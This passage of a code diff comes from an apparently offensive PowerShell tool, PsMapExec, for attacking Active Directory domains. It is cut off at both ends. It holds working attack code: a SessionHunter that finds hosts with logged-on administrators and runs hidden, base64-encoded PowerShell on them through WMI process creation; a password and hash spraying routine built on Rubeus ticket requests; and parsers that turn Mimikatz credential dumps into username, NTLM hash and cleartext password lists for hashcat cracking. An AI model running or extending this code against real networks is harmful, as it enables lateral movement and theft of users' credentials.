                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-
-}
-           
-            elseif ($result -eq "Unspecified Error"){
-            if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-
-}
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            } 
             
+            elseif ($result -eq "Unable to connect") {}
+
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
+
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
+                            $result | Write-Host
+                            Write-Host
+                            $hasDisplayedResult = $true
+                        }
+                    }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
+                }
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result) {
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            if ($Module -eq ""){
-            $result | Write-Host 
-            Write-Host
-            }
-
-    switch ($Module) {
-        "SAM" {
-            $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "LogonPasswords" {
-            $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "Tickets" {
-            $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "eKeys" {
-            $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "KerbDump" {
-            $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "LSA" {
-            $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "ConsoleHistory" {
-            $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
-        }
-        "Files" {
-            $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-            if ($ShowOutput) { $result | Write-Host }
+             # Dispose of runspace and close handle
+            $runspace.Runspace.Dispose()
+            $runspace.Handle.AsyncWaitHandle.Close()
         }
     }
-}
 
-            
-            # Check this
-            elseif ($Module -eq "Interactive") {Start-Process powershell.exe -ArgumentList '-noexit -Command', "New-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"}
-        }
-    }
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} while ($runspaces | Where-Object { -not $_.Completed })
+
+
+
+
 
 # Clean up
 $runspacePool.Close()
@@ -3188,13 +3176,20 @@ if (!$connected) {continue}   elseif ($Connected){
 ################################################################################################################
 ############################################ Function: SessionHunter ###########################################
 ################################################################################################################
-Function SessionHunter {
-    Write-Host
+Function Invoke-SessionHunter {
+Write-host
 
-    foreach ($Computer in $Computers) {
-        $OS = $Computer.Properties["operatingSystem"][0]
-        $ComputerName = $Computer.Properties["dnshostname"][0]
-        
+Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"
+
+
+# Create a runspace pool
+$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
+$runspacePool.Open()
+$runspaces = New-Object System.Collections.ArrayList
+
+$scriptBlock = {
+    param ($computerName, $Command)
+
     $tcpClient = New-Object System.Net.Sockets.TcpClient
     $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
     $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
@@ -3211,94 +3206,328 @@ Function SessionHunter {
     }
 
     $tcpClient.Close()
-    if (!$connected) {continue}   elseif ($Connected){
+    if (!$connected) {return}
+    
+    $osInfo = $null
+    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
+    if (!$osInfo){return}
 
-            $userSIDs = $null
-            $userKeys = $null
-            $remoteRegistry = $null
-            $user = $null
-            $userTranslation = $null
-            $results = @()
 
-            try {
-                # Open the remote base key
-                $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
-            } catch {
-                continue
-            }
+    Function WMI {
 
-            # Get the subkeys under HKEY_USERS
-            $userKeys = $remoteRegistry.GetSubKeyNames()
+param (
+  [string]$Command = "",
+  [string]$ComputerName,
+  [string]$Class = "PMEClass"
+)
 
-            # Initialize an array to store the user SIDs
-            $userSIDs = @()
 
-            foreach ($key in $userKeys) {
-                # Skip common keys that are not user SIDs
-                if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
-                    $userSIDs += $key
+function CreateScriptInstance([string]$ComputerName) {
+        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
+        if ($classCheck -eq $null) {
+            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
+            $newClass["__CLASS"] = "$Class"
+            $newClass.Qualifiers.Add("Static",$true)
+            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
+            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
+            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
+            $newClass.Put() | Out-Null
+        }
+        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
+        $wmiInstance.GetType() | Out-Null
+        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
+        $wmiInstance.Dispose()
+        return $CommandId
+        
+    }
+
+function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
+    try {
+        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
+        $result = $wmiInstance.CommandOutput
+        $wmiInstance.Dispose()
+        return $result
+    } 
+    catch {Write-Error $_.Exception.Message} 
+    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
+}
+
+
+    function ExecCommand([string]$ComputerName, [string]$Command) {
+        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
+        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
+        if ($process.ReturnValue -eq 0) {
+            $started = Get-Date
+            Do {
+                if ($started.AddMinutes(2) -lt (Get-Date)) {
+                    Write-Host "PID: $($process.ProcessId) - Response took too long."
+                    break
                 }
-            }
-
-            # Close the remote registry key
-            $remoteRegistry.Close()
-
-            # Resolve the SIDs to usernames
-            foreach ($sid in $userSIDs) {
-                $user = $null
-                $userTranslation = $null
-
-                try {
-                    $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
-                    $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
-
-                    $results += [PSCustomObject]@{
-                        UserName = $userTranslation.Value
-                    }
-                } catch {
-
-                }
-            }
-
-            # Display the computer information
-            if ($SuccessOnly -and $results.Count -eq "0") {
-                continue
-            } else {
-                Write-Host "SessionHunter " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "   " -NoNewline
-
-                try {
-                    $Ping = New-Object System.Net.NetworkInformation.Ping
-                    $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-                    Write-Host ("{0,-16}" -f $IP) -NoNewline
-                } catch {
-                    Write-Host ("{0,-16}" -f "") -NoNewline
-                }
-
-                Write-Host "   " -NoNewline
-                Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-                Write-Host "   " -NoNewline
-                Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-                Write-Host "   " -NoNewline
-                
-                if ($results.Count -gt 0) {
-                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                    Write-Host "SUCCESS"
-
-                    $results | ForEach-Object {
-                        Write-Host ("{0}" -f "- ") -NoNewline -ForegroundColor "Yellow"
-                        Write-Host ("{0}" -f $_.UserName)
-                        $results.UserName | Out-file -FilePath "$Sessions\$ComputerName-Sessions.txt"
-                    }
-
-                    Write-Host
-                } else {
-                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                    Write-Host "No Active Sessions"
-                }
-            }
+                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
+                Start-Sleep -Seconds 1
+            } While ($watcher -ne $null)
+            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
+            return $scriptOutput
         }
     }
+
+    $commandString = $Command
+    $scriptCommandId = CreateScriptInstance $ComputerName
+    if ($scriptCommandId -eq $null) {
+        Write-Error "Error creating remote instance."
+    }
+    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
+    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
+    $result = ExecCommand $ComputerName $encodedCommand
+    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
+    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
+    return $result
+
+    
+
+}
+
+    function AdminCount {
+        param (
+            [string]$UserName,
+            [System.DirectoryServices.DirectorySearcher]$Searcher
+        )
+
+        $Searcher.Filter = "(sAMAccountName=$UserName)"
+        $Searcher.PropertiesToLoad.Clear()
+        $Searcher.PropertiesToLoad.Add("adminCount") > $null
+
+        $user = $Searcher.FindOne()
+
+        if ($user -ne $null) {
+            $adminCount = $user.Properties["adminCount"]
+            if ($adminCount -eq 1) {
+                return $true
+            }
+        }
+        return $false
+    }
+
+    function SessionHunter {
+        param($ComputerName, $Command)
+
+        $userSIDs = @()
+        $domainCache = @{}
+        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
+        $adminPresent = $false
+
+        function GetDomainFQDNFromSID {
+            param($sid)
+            $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
+            $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
+            
+            if (-not $domainCache[$objDomain]) {
+                try {
+                    $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
+                    $domainCache[$objDomain] = $FQDN
+                } catch {
+                    return $objDomain
+                }
+            }
+            return $domainCache[$objDomain]
+        }
+
+        try {
+            $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
+        } catch {
+            return
+        }
+
+        $userKeys = $remoteRegistry.GetSubKeyNames()
+
+        foreach ($key in $userKeys) {
+            if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
+                $userSIDs += $key
+            }
+        }
+
+        $remoteRegistry.Close()
+
+        foreach ($sid in $userSIDs) {
+            try {
+                $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
+                $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
+                $username = $userTranslation.Value.Split('\')[1]
+                
+                if (AdminCount -UserName $username -Searcher $Searcher) {
+                    $adminPresent = $true
+                    break
+                }
+            } catch {}
+        }
+
+        if ($adminPresent) {
+            if ($Command -eq ""){
+            # We can just return as OSinfo was checked earlier in script
+            return "Successful connection PME"
+            
+            }
+            elseif ($Command -ne ""){
+
+            return WMI $ComputerName -command $Command
+            
+            }
+        }
+
+    }
+
+   SessionHunter -ComputerName $computerName -command $Command
+
+}
+
+
+function Display-ComputerStatus {
+    param (
+        [string]$ComputerName,
+        [string]$OS,
+        [System.ConsoleColor]$statusColor = 'White',
+        [string]$statusSymbol = "",
+        [string]$statusText = "",
+        [int]$NameLength,
+        [int]$OSLength
+    )
+
+    # Prefix
+    Write-Host "SessionHunter " -ForegroundColor Yellow -NoNewline
+    Write-Host "   " -NoNewline
+
+          # Attempt to resolve the IP address
+        $IP = $null
+        $Ping = New-Object System.Net.NetworkInformation.Ping 
+        $Result = $Ping.Send($ComputerName, 10)
+
+        if ($Result.Status -eq 'Success') {
+            $IP = $Result.Address.IPAddressToString
+            Write-Host ("{0,-16}" -f $IP) -NoNewline
+        }
+    
+        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
+    
+    # Display ComputerName and OS
+    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
+    Write-Host "   " -NoNewline
+    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+    Write-Host "   " -NoNewline
+
+    # Display status symbol and text
+    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
+    Write-Host $statusText
+}
+
+
+# Create and invoke runspaces for each computer
+foreach ($computer in $computers) {
+
+    $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
+    
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
+    $runspace.RunspacePool = $runspacePool
+
+    [void]$runspaces.Add([PSCustomObject]@{
+        Runspace = $runspace
+        Handle = $runspace.BeginInvoke()
+        ComputerName = $ComputerName
+        OS = $OS
+        Completed = $false
+        })
+}
+
+# Poll the runspaces and display results as they complete
+do {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
+        if ($runspace.Handle.IsCompleted) {
+            $runspace.Completed = $true
+            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
+            $hasDisplayedResult = $false
+
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
+            elseif ($result -eq "Successful Connection PME") {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            } 
+            
+            elseif ($result -eq "Unable to connect") {}
+
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
+
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
+                            $result | Write-Host
+                            Write-Host
+                            $hasDisplayedResult = $true
+                        }
+                    }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
+                }
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+            }
+
+             # Dispose of runspace and close handle
+            $runspace.Runspace.Dispose()
+            $runspace.Handle.AsyncWaitHandle.Close()
+        }
+    }
+
+    Start-Sleep -Milliseconds 100
+} while ($runspaces | Where-Object { -not $_.Completed })
+
+
+
+# Clean up
+$runspacePool.Close()
+$runspacePool.Dispose()
+
+
 }
 
 ################################################################################################################
@@ -3306,10 +3535,15 @@ Function SessionHunter {
 ################################################################################################################
 Function Spray {
 Write-host
-    
+
 if (!$EmptyPassword -and !$AccountAsPassword -and $Hash -eq "" -and $Password -eq ""){
 Write-Host "[-] " -ForegroundColor "Red" -NoNewline
 Write-Host "We need something to spray"
+Write-Host
+Write-host "PsMapExec -Method Spray -Password [Password]"
+Write-host "PsMapExec -Method Spray -Hash [Hash]"
+Write-host "PsMapExec -Method Spray -AccountAsPassword"
+Write-host "PsMapExec -Method Spray -EmptyPassword"
 return
 }
 
@@ -3386,8 +3620,16 @@ Write-Output " - Safety Limit value : $SafeLimit"
 Write-Output " - Removed disabled accounts from spraying"
 
 if ($Hash -ne ""){
+    Write-Host
     $Password = ""
     $AccountAsPassword = $False
+
+    if ($Hash.Length -ne 32 -and $Hash.Length -ne 64) {
+        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
+        Write-Host 
+        return
+    }
 
     Write-Host
     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
@@ -3430,7 +3672,6 @@ if ($EmptyPassword){
 }
 
 
-
 foreach ($UserToSpray in $EnabledDomainUsers){
 		$Delay = Get-Random -Minimum 8 -Maximum 90
 		Start-Sleep -Milliseconds $Delay
@@ -3446,11 +3687,10 @@ $searchResult = $searcher.FindOne()
                     continue
     }
 }
-
+           # Hash Spraying
             if ($Hash -ne ""){
-            
             if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
-            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
+            elseif ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3529,6 +3769,7 @@ $searchResult = $searcher.FindOne()
             Write-Host "$Domain\$UserToSpray"
             }
         }
+    
     }
 }
 
@@ -3631,21 +3872,25 @@ foreach ($File in $Files){
     $Results = $LogonPasswordsOutput | Select-String "\[00000003\] Primary" -Context 0,4| ForEach-Object {
         $Output = $_.Context.PostContext
 
-        # Extract the values for Username, Domain, and NTLM
-        $Username = $output[0] -replace "^\s+\*\sUsername\s+:\s"
-        #$Domain = $output[1] -replace "^\s+\*\sDomain\s+:\s"
-        $NTLM = $output[2] -replace "^\s+\*\sNTLM\s+:\s"
+# Extract the values for Username, Domain, NTLM, and Password
+$Username = $output[0] -replace "^\s+\*\sUsername\s+:\s"
+$Domain = $output[1] -replace "^\s+\*\sDomain\s+:\s"
+$NTLM = $output[2] -replace "^\s+\*\sNTLM\s+:\s"
+# Trying to extract Password; if not existent, set to (null)
+$Password = if($output[3] -match "^\s+\*\sPassword\s+:\s") { $output[3] -replace "^\s+\*\sPassword\s+:\s" } else { "(null)" }
+
 
         # Create a new object with the extracted values
         [PSCustomObject]@{
-            Username = $Username
+            Username = "$Domain\$Username"
             NTLM = $NTLM
-            #Domain = $Domain
+            Password = $Password
+
         } 
     }
 
     # Sort the results by username and remove duplicates
-    $UniqueResults = $Results | Sort-Object -Property "Username" -Unique | Format-Table -Property Username, NTLM, Domain, Password -HideTableHeaders
+    $UniqueResults = $Results | Sort-Object -Property "Username" -Unique | Format-Table -Property Username, NTLM, Password -AutoSize
 
     if ($UniqueResults) {
         $FileToSplit = "$File.Name"
@@ -3654,7 +3899,7 @@ foreach ($File in $Files){
 
         # Format the output as a table and display it
         $FilePath = $LogonPasswordsOutputDirectory + "Hashes-" + "$File.Name" + ".txt"
-        $FormattedResults = $UniqueResults | Format-Table -AutoSize | Out-String -Width "1024"
+        $FormattedResults = $UniqueResults | Format-Table  -AutoSize | Out-String -Width "1024"
 
         # Remove empty lines from the formatted results
         $FilteredResults = $FormattedResults -split '\r?\n' | Where-Object { $_.Trim() -ne '' } | Out-String
@@ -3689,14 +3934,25 @@ $UpdatedlLines | Set-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt"
 # Print unique NTLM hashes within the banner
 Write-Host
 Write-Host "-------------------------------------- All collected NTLM Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
-Get-Content  -path "$LogonPasswords\.All-Unique-NTLM.txt" | Sort-Object -Unique | Format-Table -AutoSize
-Write-Host
+# Extracting and printing USERNAME:NTLM pairs, assuming they are colon-separated and not headers
+Get-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt" | 
+    Where-Object {$_ -notmatch "Username:NTLM:Password" -and $_ -match '^[^\:]+\:[a-fA-F0-9]{32}' } |
+    ForEach-Object {
+        $parts = $_ -split ":"
+        "$($parts[0]):$($parts[1])"
+    } | Sort-Object -Unique | ForEach-Object {
+        Write-Output "$_"
+    }
+
 Write-Host "----------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
 Write-Host 
 Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
 Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
 Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
 Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
+
+
+
     
     }
 }
@@ -3705,20 +3961,20 @@ Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
 ################################################# Function: Parse-eKeys ########################################
 ################################################################################################################
 Function Parse-eKeys {
-
-
     if ($Module -eq "eKeys" -and $Option -eq "Parse") {
-    Write-Host
-    Write-Host
-    Write-Host "Parsing Results" -ForegroundColor "Yellow"
-    Write-Host
-    Start-Sleep -Seconds "5"
+        Write-Host
+        Write-Host
+        Write-Host "Parsing Results" -ForegroundColor "Yellow"
+        Write-Host
+        Start-Sleep -Seconds "5"
         $outputFilePath = "$ekeys\.eKeys-Parsed.txt"
 
-        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" |  Where-Object { $_.Length -gt 0 } | ForEach-Object {
+        # Initialize the DirectorySearcher outside of the loop for better performance
+        $domainSearcher = New-Object System.DirectoryServices.DirectorySearcher
+
+        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
             $Computer = $_.BaseName -split '\.' | Select-Object -First 1
-            $ComputerFormed = "{0}" -f $Computer
-            Write-Host $ComputerFormed -ForegroundColor Yellow
+            Write-Host $Computer -ForegroundColor Yellow
 
             $filePath = $_.FullName
             $fileContent = Get-Content -Path $filePath -Raw
@@ -3730,38 +3986,56 @@ Function Parse-eKeys {
 
             foreach ($match in $matches) {
                 $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
-                $groupKey = "$username-$domain"
+                $domainUsername = "$($domain.ToLower())\$username"
+                $groupKey = $domainUsername
 
                 if (!$uniqueGroups.ContainsKey($groupKey)) {
+                    $notes = ""  # This will store the notes
+
+                    $isAdminGroupMember = $DomainAdmins -contains $username -or
+                                          $EnterpriseAdmins -contains $username -or
+                                          $ServerOperators -contains $username -or
+                                          $AccountOperators -contains $username
+
+                    # Do not display the adminCount if a user is a member of the specified groups
+                    if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
+                        $notes += "[AdminCount:1]"
+                    }
+
+                    # Check for Empty Password hash
+                    if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
+                        $notes += "[Empty Password]"
+                    }
+
+                    # Checks for group memberships
+                    if ($DomainAdmins -contains $username) {
+                        $notes += "[Domain Admin]"
+                    }
+                    if ($EnterpriseAdmins -contains $username) {
+                        $notes += "[Enterprise Admin]"
+                    }
+                    if ($ServerOperators -contains $username) {
+                        $notes += "[Server Operator]"
+                    }
+                    if ($AccountOperators -contains $username) {
+                        $notes += "[Account Operator]"
+                    }
+
                     $group = [PSCustomObject]@{
-                        Username = $username
-                        Domain = $domain
+                        DomainUsername = $domainUsername
                         Password = $password
                         KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
+                        Notes = $notes
                     }
+
                     $uniqueGroups[$groupKey] = $group
 
-                    Write-Host "Username   : " -NoNewline
-                    Write-Host $username  -NoNewline
-
-                    if ($DomainAdmins -contains $username) {
-                        Write-Host " [Domain Admin]" -ForegroundColor "Yellow" -NoNewline
+                    Write-Host "Username   : $domainUsername"
+                    if (-not [string]::IsNullOrWhiteSpace($notes)) {
+                        Write-Host "Notes      : " -NoNewline
+                        Write-Host $notes -ForegroundColor Yellow -NoNewline
+                        Write-Host ""
                     }
-
-                    if ($EnterpriseAdmins -contains $username) {
-                        Write-Host " [Enterprise Admin]" -ForegroundColor "Yellow" -NoNewline
-                    }
-
-                    if ($ServerOperators -contains $username) {
-                        Write-Host " [Server Operator]" -ForegroundColor "Yellow" -NoNewline
-                    }
-
-                    if ($AccountOperators -contains $username) {
-                        Write-Host " [Account Operator]" -ForegroundColor "Yellow" -NoNewline
-                    }
-
-                    Write-Host ""
-                    Write-Host "Domain     : $domain"
                     Write-Host "Password   : $password"
 
                     foreach ($key in $group.KeyList) {
@@ -3770,13 +4044,36 @@ Function Parse-eKeys {
                             Write-Host "$($keyParts[0]): $($keyParts[1])"
                         }
                     }
-
                     Write-Host ""
                 }
             }
         }
     }
 }
+
+function AdminCount {
+    param (
+        [string]$UserName,
+        [System.DirectoryServices.DirectorySearcher]$Searcher
+    )
+
+    $Searcher.Filter = "(sAMAccountName=$UserName)"
+    $Searcher.PropertiesToLoad.Clear()
